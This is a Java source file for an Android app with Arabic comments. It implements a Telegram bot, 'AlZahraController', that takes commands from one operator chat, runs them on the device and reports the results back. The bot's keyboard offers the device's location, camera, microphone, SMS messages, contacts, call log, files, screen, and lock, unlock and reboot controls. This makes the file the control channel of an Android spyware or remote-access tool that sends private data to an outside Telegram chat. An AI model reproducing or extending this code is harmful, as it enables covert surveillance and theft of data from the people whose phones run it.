package com.alzahra.telegram;

import android.content.Context;
import android.util.Log;

import com.alzahra.data.CommandExecutor;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.updatingmessages.EditMessageText;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardButton;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import java.util.ArrayList;
import java.util.List;

public class BotManager {
    private static final String TAG = "BotManager";
    private final String botToken;
    private final String chatId;
    private final Context context;
    private TelegramLongPollingBot bot;
    private boolean isRunning = false;
    private boolean isConnected = false;
    private CommandExecutor executor;

    public BotManager(String token, String chat, Context ctx) {
        this.botToken = token;
        this.chatId = chat;
        this.context = ctx;
        this.executor = new CommandExecutor(ctx, token, chat);
    }

    public void start() {
        new Thread(() -> {
            try {
                TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
                bot = createBot();
                botsApi.registerBot(bot);
                isRunning = true;
                isConnected = true;
                Log.d(TAG, "Bot started successfully");
                
                // إرسال رسالة "عودة الاتصال" إذا كان reconnect
                sendStatusMessage("🟢 *تم إعادة الاتصال*\nالنظام جاهز للاستقبال");
                sendDashboard();
                
            } catch (Exception e) {
                Log.e(TAG, "Bot start error: " + e.getMessage());
                isConnected = false;
            }
        }).start();
    }

    public void stop() {
        isRunning = false;
        isConnected = false;
    }

    public boolean isConnected() {
        return isConnected;
    }

    private TelegramLongPollingBot createBot() {
        return new TelegramLongPollingBot() {
            @Override
            public String getBotToken() {
                return botToken;
            }

            @Override
            public String getBotUsername() {
                return "AlZahraController";
            }

            @Override
            public void onUpdateReceived(Update update) {
                if (!isRunning) return;
                
                if (update.hasMessage() && update.getMessage().hasText()) {
                    String messageText = update.getMessage().getText();
                    String userChatId = update.getMessage().getChatId().toString();
                    
                    // التحقق من الصلاحيات
                    if (!userChatId.equals(chatId)) {
                        sendMessage("⛔ *غير مصرح لك*\nمعرفك: `" + userChatId + "`");
                        return;
                    }
                    
                    // تنفيذ الأمر وإرسال التقرير
                    executeCommandWithFeedback(messageText);
                    
                } else if (update.hasCallbackQuery()) {
                    // أزرار Inline (للتطوير المستقبلي)
                    String data = update.getCallbackQuery().getData();
                    executeCommandWithFeedback("/" + data);
                }
            }
        };
    }

    private void executeCommandWithFeedback(String command) {
        new Thread(() -> {
            long startTime = System.currentTimeMillis();
            String cmd = command.replace("/", "").trim();
            
            // إرسال "جاري التنفيذ"
            SendMessage processingMsg = new SendMessage(chatId, "⏳ *جاري تنفيذ:* `" + cmd + "`...");
            processingMsg.setParseMode("Markdown");
            String messageId = null;
            
            try {
                org.telegram.telegrambots.meta.api.objects.Message sentMsg = bot.execute(processingMsg);
                messageId = sentMsg.getMessageId().toString();
            } catch (Exception e) {
                Log.e(TAG, "Error sending processing message: " + e.getMessage());
            }
            
            // التنفيذ الفعلي
            CommandResult result = executor.execute(command);
            
            long duration = System.currentTimeMillis() - startTime;
            
            // إرسال النتيجة
            String statusEmoji = result.success ? "✅" : "❌";
            String statusText = result.success ? "نجاح" : "فشل";
            
            StringBuilder response = new StringBuilder();
            response.append(statusEmoji).append(" *").append(statusText).append("*\n\n");
            response.append("📝 *الأمر:* `").append(cmd).append("`\n");
            response.append("⏱️ *المدة:* ").append(duration).append("ms\n\n");
            
            if (result.success) {
                if (result.data != null && !result.data.isEmpty()) {
                    response.append("📊 *النتيجة:*\n").append(result.data);
                } else {
                    response.append("✅ تم التنفيذ بنجاح");
                }
            } else {
                response.append("❌ *خطأ:*\n`").append(result.error).append("`");
            }
            
            // تحديث الرسالة أو إرسال جديدة
            if (messageId != null) {
                editMessage(messageId, response.toString());
            } else {
                sendMessage(response.toString());
            }
            
            // إعادة لوحة التحكم بعد الأمر
            if (result.showDashboard) {
                sendDashboard();
            }
        }).start();
    }

    public void sendDashboard() {
        SendMessage message = new SendMessage(chatId, 
            "🎛️ *لوحة التحكم المتكاملة*\n\n" +
            "اختر أحد الأوامر من الأسفل:");
        message.setParseMode("Markdown");
        
        // إنشاء لوحة الأزرار
        ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
        keyboard.setResizeKeyboard(true);
        keyboard.setOneTimeKeyboard(false);
        keyboard.setSelective(true);
        
        List<KeyboardRow> rows = new ArrayList<>();
        
        // الصف الأول: الموقع والكاميرا
        KeyboardRow row1 = new KeyboardRow();
        row1.add(new KeyboardButton("📍 موقعي"));
        row1.add(new KeyboardButton("📸 كاميرا"));
        row1.add(new KeyboardButton("🎤 ميكروفون"));
        rows.add(row1);
        
        // الصف الثاني: البيانات
        KeyboardRow row2 = new KeyboardRow();
        row2.add(new KeyboardButton("📱 معلومات الجهاز"));
        row2.add(new KeyboardButton("🔋 البطارية"));
        row2.add(new KeyboardButton("📶 الواي فاي"));
        rows.add(row2);
        
        // الصف الثالث: جمع البيانات
        KeyboardRow row3 = new KeyboardRow();
        row3.add(new KeyboardButton("💬 الرسائل"));
        row3.add(new KeyboardButton("👥 جهات الاتصال"));
        row3.add(new KeyboardButton("📞 سجل المكالمات"));
        rows.add(row3);
        
        // الصف الرابع: التطبيقات والملفات
        KeyboardRow row4 = new KeyboardRow();
        row4.add(new KeyboardButton("📦 التطبيقات"));
        row4.add(new KeyboardButton("📁 الملفات"));
        row4.add(new KeyboardButton("📱 الشاشة"));
        rows.add(row4);
        
        // الصف الخامس: التحكم
        KeyboardRow row5 = new KeyboardRow();
        row5.add(new KeyboardButton("🔒 قفل"));
        row5.add(new KeyboardButton("🔓 فتح"));
        row5.add(new KeyboardButton("🔄 إعادة تشغيل"));
        rows.add(row5);
        
        // الصف السادس: المساعدة
        KeyboardRow row6 = new KeyboardRow();
        row6.add(new KeyboardButton("❓ مساعدة"));
        row6.add(new KeyboardButton("🔄 تحديث"));
        rows.add(row6);
        
        keyboard.setKeyboard(rows);
        message.setReplyMarkup(keyboard);
        
        try {
            bot.execute(message);
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send dashboard error: " + e.getMessage());
        }
    }

    private void sendStatusMessage(String text) {
        SendMessage message = new SendMessage(chatId, text);
        message.setParseMode("Markdown");
        try {
            bot.execute(message);
        } catch (Exception e) {
            Log.e(TAG, "Send status error: " + e.getMessage());
        }
    }

    private void sendMessage(String text) {
        SendMessage message = new SendMessage(chatId, text);
        message.setParseMode("Markdown");
        try {
            bot.execute(message);
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send message error: " + e.getMessage());
        }
    }
    
    private void editMessage(String messageId, String newText) {
        try {
            EditMessageText edit = new EditMessageText();
            edit.setChatId(chatId);
            edit.setMessageId(Integer.parseInt(messageId));
            edit.setText(newText);
            edit.setParseMode("Markdown");
            bot.execute(edit);
        } catch (Exception e) {
            // إذا فشل التعديل، أرسل رسالة جديدة
            sendMessage(newText);
        }
    }
}
